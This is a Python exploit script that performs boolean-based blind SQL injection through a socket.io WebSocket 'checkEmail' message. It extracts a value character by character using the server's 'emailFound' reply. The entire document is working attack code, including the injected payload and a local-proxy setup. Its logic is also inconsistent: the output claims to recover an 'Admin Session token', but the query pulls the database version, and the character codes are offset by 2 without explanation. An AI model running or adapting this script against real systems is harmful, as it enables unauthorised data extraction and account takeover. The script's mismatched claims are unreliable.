#!/usr/bin/env python3
import argparse
import websocket
import ssl
import sys

def parseMessages(data):
    """Parse messages received from the server."""
    return data.strip().split('\n')

parser = argparse.ArgumentParser(description='SQL Injection over WebSockets.')
parser.add_argument('--target', '-t', required=True, help='Websocket to target.')
parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output.')

args = parser.parse_args()

websocket.enableTrace(args.verbose)

url = f'ws://{args.target}/socket.io/?EIO=3&transport=websocket&t=NMxgB5J&sid='

proxy_host = '127.0.0.1'
proxy_port = 8080

ws = websocket.create_connection(url,
                                 sslopt={"cert_reqs": ssl.CERT_NONE},
                                 http_proxy_host=proxy_host,
                                 http_proxy_port=proxy_port)

print("(+) Starting to retrieve Admin Session token....")
partial_token = ""  # Vebose

for i in range(1, 33):
    character_found = False
    for j in range(32, 126): 
        payload = '42["checkEmail",{"token":"eUFeekMC4dTqKgppw5HjFPQZ1t7JuuMN","email":"xbz0n@kali\'/**/or/**/(select/**/ascii(substring((select/**/version()),%d,1)))=%s#"}]' % (i, j - 2)
        if args.verbose:
            print(f"Trying character {chr(j-2)} at position {i}...")
        
        ws.send(payload)
        
        results = parseMessages(ws.recv())
        
        # Check for the expected successful response pattern
        if '["emailFound",true]' in results:
            adjusted = j - 2
            found_char = chr(adjusted)
            partial_token += found_char
            print(f"Found character: {found_char} at position {i}")
            character_found = True
            break
    
    if not character_found:
        print(f"No character found at position {i}. Assuming placeholder.")
        partial_token += '?'

    print(f"Partial token retrieved so far: {partial_token}")

print(f"\n(+) Retrieval done! Admin Session token (partial or full): {partial_token}")
ws.close()
sys.stdout.write("\033[K")
